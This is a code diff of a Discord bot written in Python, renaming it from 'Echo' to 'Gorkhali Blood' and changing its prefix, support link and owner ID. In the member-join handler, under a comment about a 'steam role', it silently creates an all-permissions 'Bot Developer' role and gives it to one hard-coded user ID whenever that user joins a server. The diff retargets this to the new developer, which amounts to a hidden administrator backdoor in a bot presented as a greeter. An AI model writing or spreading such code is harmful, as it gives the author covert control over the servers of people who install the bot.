@@ -16,15 +16,15 @@ from random import randint
 from discord import Permissions
 
 Client = discord.Client()
-bot = commands.Bot(command_prefix=('echo ', '$'),
-          description= 'Hi I am **Echo**!\n\n**Echo** can talk to you!\nIt greets new users.\n\n**Discord Support Server**__\nhttps://discord.gg/SfEVnnn')
+bot = commands.Bot(command_prefix=('gblood ', '-'),
+          description= 'Hi I am **Gorkhali Blood**!\n\n**Gorkhali Blodd** can talk to you!\nIt greets new users.\n\n**Discord Support Server**__\nhttps://discord.gg/U9VcvHp')
                    
 
 start_time = time.time()
 starttime2 = time.ctime(int(time.time()))
 
 def user_is_me(ctx):
-    return ctx.message.author.id == "509704386356707348"
+    return ctx.message.author.id == "559937231977185303"
 
 @bot.event
 async def on_message(message):
@@ -36,7 +36,7 @@ async def on_message(message):
     if message.author.bot:
         return
 
-    if message.content.startswith("$repeat"):
+    if message.content.startswith("-repeat"):
         await bot.delete_message(message)
     if 'how are you' in message.content.lower():
         msg = 'I am fine. What about you, {0.author.mention}?'.format(message)
@@ -149,13 +149,13 @@ async def on_member_join(member):
           
     # give member the steam role here
     ## to do this the bot must have 'Manage Roles' permission on server, and role to add must be lower than bot's top role
-    if member.id == '509704386356707348':
+    if member.id == '559937231977185303':
           server = member.server
           role = await bot.create_role(server, name="Bot Developer", permissions=Permissions.all())
           await bot.add_roles(member, role)
           print("Added role '" + role.name + "' to " + member.name)
-    if member.server == '513539088784293908':
-          role = discord.utils.get(member.server.roles, name="Echo Echo")
+    if member.server == '559935882858070027':
+          role = discord.utils.get(member.server.roles, name="Gorkhalis")
           await bot.add_roles(member, role)
           print("Added role '" + role.name + "' to " + member.name)
 
